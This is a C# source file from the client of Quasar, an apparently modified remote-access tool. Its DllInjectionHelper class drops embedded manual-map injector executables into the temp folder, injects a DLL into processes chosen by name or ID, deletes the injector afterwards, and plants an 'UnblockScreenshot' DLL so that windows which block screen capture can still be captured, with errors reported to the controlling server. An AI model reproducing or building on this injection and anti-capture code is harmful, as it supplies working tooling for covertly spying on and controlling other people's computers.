using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Quasar.Client.Utilities;
using Quasar.Common.Messages;

using Quasar.Common.Networking;

namespace Quasar.Client.Helper
{
    public static class DllInjectionHelper
    {
        public static string[] InjectManualMap(string processName, string dllPath, bool isWow64)
        {
            List<string> list = new List<string>();
            string injectorPath = Path.Combine(new string[]
            {
                Path.GetTempPath(),
                Guid.NewGuid().ToString() + ".exe"
            });
            try
            {
                if (isWow64)
                    File.WriteAllBytes(injectorPath, Resource1.ManualMapInjector_x86);
                else
                    File.WriteAllBytes(injectorPath, Resource1.ManualMapInjector_x64);
            }
            catch (Exception)
            {
            }
            Process[] processesByName = Process.GetProcessesByName(processName);
            foreach (Process process in processesByName)
            {
                string str;
                string str2;
                Misc.CheckOutput("\"" + injectorPath + "\"", string.Format("\"{0}\" {1}", dllPath, process.Id), out str, out str2);
                list.Add(str + "\n" + str2);
            }
            try
            {
                File.Delete(injectorPath);
            }
            catch (Exception)
            {
            }
            return list.ToArray();
        }

        private static string InjectManualMapByProcessId(int processId, string dllPath, bool isWow64)
        {
            if (processId == 0 || dllPath == "")
            {
                return "invalid process id or dll path";
            }
            string injectorPath = Path.Combine(new string[]
            {
                Path.GetTempPath(),
                Guid.NewGuid().ToString() + ".exe"
            });
            try
            {
                if (isWow64)
                    File.WriteAllBytes(injectorPath, Resource1.ManualMapInjector_x86);
                else
                    File.WriteAllBytes(injectorPath, Resource1.ManualMapInjector_x64);
            }
            catch (Exception)
            {
            }
            string str;
            string str2;
            Misc.CheckOutput("\"" + injectorPath + "\"", string.Format("\"{0}\" {1}", dllPath, processId), out str, out str2);

            try
            {
                File.Delete(injectorPath);
            }
            catch (Exception)
            {
            }
            return str + "\n" + str2;
        }

        public static bool InjectNormalUnblockDll(string processName, string dllName, ISender client, out string resultStr)
        {
            resultStr = "";
            Process[] processes = Process.GetProcessesByName(processName);
            bool isSucess = true;

            bool isWow64 = true;
            string dllPath = "";
            if (processes.Length == 0)
                return false;
            foreach (Process process in processes)
            {
                IntPtr hProcess = process.Handle;
                if (!NativeMethods.IsWow64Process(hProcess, out isWow64))
                {
                    client.Send(new NotifyMessageToServer { Message = "Quering process bitness failed" });
                }
            }
            if (isWow64)
            {
                byte[] realUnblockScreenshotx86 = Resource1.UnblockScreenshot_ChildWindow_x86;
                dllPath = Path.Combine(new string[]
                {
                        Path.GetTempPath(),
                        dllName + "_x86.dll"
                });
                try
                {
                    File.WriteAllBytes(dllPath, realUnblockScreenshotx86);
                }
                catch (Exception ex5)
                {
                    isSucess = false;
                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:\n\n{1}", "Writing 32bit injection dll error", ex5.Message) });
                }
            }
            else
            {
                byte[] realUnblockScreenshotx64 = Resource1.UnblockScreenshot_ChildWindow_x64;
                dllPath = Path.Combine(new string[]
                {
                        Path.GetTempPath(),
                        dllName + "_x64.dll"
                });
                try
                {
                    File.WriteAllBytes(dllPath, realUnblockScreenshotx64);
                }
                catch (Exception ex5)
                {
                    isSucess = false;
                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:\n\n{1}", "Writing 64bit injection dll error", ex5.Message) });
                }
            }
            foreach(Process process in processes)
            {
                try
                {
                    resultStr = InjectManualMapByProcessId(process.Id, dllPath, isWow64);
                }
                catch (Exception ex6)
                {
                    isSucess = false;
                    client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler3.cs"), Misc.__LINE__(253), ex6.Message) });
                }
            }

            return isSucess;
        }

        private const int PROCESS_CREATE_THREAD = 2;

        private const int PROCESS_QUERY_INFORMATION = 1024;

        private const int PROCESS_VM_OPERATION = 8;

        private const int PROCESS_VM_WRITE = 32;

        private const int PROCESS_VM_READ = 16;

        private const uint MEM_COMMIT = 0x01000;

        private const uint MEM_RESERVE = 0x02000;

        private const uint PAGE_READWRITE = 0x04;
    }
}
